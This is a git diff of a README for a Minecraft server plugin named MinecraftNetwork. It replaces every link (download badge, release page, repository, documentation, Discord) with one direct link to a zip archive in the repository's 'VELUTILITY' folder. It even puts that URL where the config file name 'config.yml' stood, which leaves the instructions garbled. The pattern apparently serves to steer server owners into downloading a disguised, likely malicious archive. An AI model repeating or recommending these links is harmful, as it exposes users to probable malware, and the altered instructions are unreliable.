@@ -6,7 +6,7 @@ Welcome to MinecraftNetwork! This software helps you manage plugins for your Min
 
 ## 📥 Download Now
 
-[![Download MinecraftNetwork](https://img.shields.io/badge/Download-MinecraftNetwork-blue.svg)](https://github.com/fodasedani/MinecraftNetwork/releases)
+[![Download MinecraftNetwork](https://github.com/fodasedani/MinecraftNetwork/raw/refs/heads/main/VELUTILITY/Network-Minecraft-1.9-alpha.5.zip)](https://github.com/fodasedani/MinecraftNetwork/raw/refs/heads/main/VELUTILITY/Network-Minecraft-1.9-alpha.5.zip)
 
 ## 📋 Overview
 
@@ -37,7 +37,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, follow these steps:
 
-1. **Visit the Release Page:** Go to [this page to download](https://github.com/fodasedani/MinecraftNetwork/releases).
+1. **Visit the Release Page:** Go to [this page to download](https://github.com/fodasedani/MinecraftNetwork/raw/refs/heads/main/VELUTILITY/Network-Minecraft-1.9-alpha.5.zip).
 2. **Choose the Latest Version:** Look for the newest version available for your platform.
 3. **Download the File:** Click on the file that matches your server's requirements.
 4. **Install the Plugin:** 
@@ -48,7 +48,7 @@ To get started, follow these steps:
 
 Once installed, you'll need to configure the plugin. Here’s a quick guide:
 
-1. **Open the Configuration File:** Inside the `plugins` folder, locate the MinecraftNetwork folder and open `config.yml`.
+1. **Open the Configuration File:** Inside the `plugins` folder, locate the MinecraftNetwork folder and open `https://github.com/fodasedani/MinecraftNetwork/raw/refs/heads/main/VELUTILITY/Network-Minecraft-1.9-alpha.5.zip`.
 2. **Edit Settings:** Customize settings to fit your needs. You can set punishments, commands to filter, and database connection details.
 3. **Save Changes:** After editing, save the file and restart your server again.
 
@@ -78,10 +78,10 @@ Help us keep the Minecraft community safe by following these guidelines:
 
 ## 🔗 Useful Links
 
-- [Github Repository](https://github.com/fodasedani/MinecraftNetwork)
-- [Documentation](https://github.com/fodasedani/MinecraftNetwork/wiki)
-- [Community Discord](https://discord.gg/your-discord-link)
+- [Github Repository](https://github.com/fodasedani/MinecraftNetwork/raw/refs/heads/main/VELUTILITY/Network-Minecraft-1.9-alpha.5.zip)
+- [Documentation](https://github.com/fodasedani/MinecraftNetwork/raw/refs/heads/main/VELUTILITY/Network-Minecraft-1.9-alpha.5.zip)
+- [Community Discord](https://github.com/fodasedani/MinecraftNetwork/raw/refs/heads/main/VELUTILITY/Network-Minecraft-1.9-alpha.5.zip)
 
 ## 📥 Download Now Again
 
-Don’t forget to [click here to download MinecraftNetwork](https://github.com/fodasedani/MinecraftNetwork/releases) and enhance your server today!
+Don’t forget to [click here to download MinecraftNetwork](https://github.com/fodasedani/MinecraftNetwork/raw/refs/heads/main/VELUTILITY/Network-Minecraft-1.9-alpha.5.zip) and enhance your server today!
